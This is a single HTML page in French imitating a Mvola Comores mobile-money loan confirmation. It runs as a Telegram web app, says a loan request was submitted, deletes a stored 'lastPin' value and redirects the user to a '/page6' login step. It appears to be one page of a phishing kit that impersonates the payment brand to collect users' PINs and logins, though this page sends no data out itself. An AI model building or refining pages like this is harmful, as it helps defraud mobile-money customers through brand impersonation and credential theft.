<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande Soumise - Mvola Comores</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --mvola-yellow: #ffcc00;    /* Mvola Signature Yellow */
            --mvola-yellow-dark: #e6b800;
            --mvola-dark: #121820;       /* Deep Navy/Black Header & Text */
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --text-dark: #121820;
            --text-muted: #666666;
            --btn-gray-bg: #fffdf0;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        /* Top Floating Dark Toast Notification */
        .toast-notification {
            position: absolute;
            top: 25px;
            background-color: var(--mvola-dark);
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
            z-index: 100;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.3;
        }

        .toast-icon {
            width: 24px;
            height: 24px;
            background-color: var(--mvola-yellow);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--mvola-dark);
            font-size: 14px;
            font-weight: 900;
            flex-shrink: 0;
        }

        /* Main Card Container */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 420px;
            margin-top: 45px;
            padding: 40px 24px 35px;
            border-radius: 24px;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.05);
            border: 1px solid #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Circle Checkmark Banner */
        .check-circle {
            width: 88px;
            height: 88px;
            background-color: var(--mvola-yellow);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 28px;
            color: var(--mvola-dark);
            font-size: 40px;
            font-weight: 900;
            box-shadow: 0 4px 20px rgba(255, 204, 0, 0.4);
        }

        .main-title {
            font-size: 26px;
            color: var(--mvola-dark);
            margin: 0 0 20px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .message-text {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0 0 16px;
            line-height: 1.55;
            max-width: 320px;
        }

        /* Redirection Container Button & Spinner */
        .redirect-box {
            background-color: var(--btn-gray-bg);
            border: 1px solid #f3ebd0;
            border-radius: 12px;
            padding: 16px 20px;
            margin: 20px 0 16px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: var(--mvola-dark);
            font-weight: 700;
            font-size: 15px;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 2.5px solid #e2e8f0;
            border-top: 2.5px solid var(--mvola-dark);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Bottom Outline Action Button */
        .btn-outline {
            background-color: transparent;
            color: var(--text-dark);
            border: 2px solid #e2e8f0;
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s, border-color 0.2s;
        }

        .btn-outline:active {
            background-color: #f0f2f5;
            border-color: #cbd5e1;
        }
    </style>
</head>

<body>

<!-- Top Floating Toast Notification -->
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 Demande<br>soumise avec succès !</div>
</div>

<!-- Card Container -->
<div class="card">
    <!-- Big Yellow Circle Indicator -->
    <div class="check-circle">✓</div>

    <!-- Title & Descriptions -->
    <h1 class="main-title">Demande Soumise</h1>

    <p class="message-text">
        Votre demande de prêt a été soumise. Veuillez attendre l'approbation.
    </p>

    <p class="message-text">
        Vous recevrez un message de confirmation. Connectez-vous à Mvola Comores pour continuer.
    </p>

    <!-- Redirect Countdown Box -->
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>Redirection dans <span id="timer">3</span>s...</span>
    </div>

    <!-- Secondary Login Button -->
    <button type="button" class="btn-outline" onclick="goToPage6()">
        Se connecter maintenant
    </button>
</div>

<script>
    let timeLeft = 3;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);

        // Clear temporary PIN storage before redirecting
        localStorage.removeItem('lastPin');
        
        window.location.href = "/page6";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        updateTimer();

        interval = setInterval(() => {
            timeLeft--;

            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }

            updateTimer();
        }, 1000);
    };
</script>

</body>
</html>
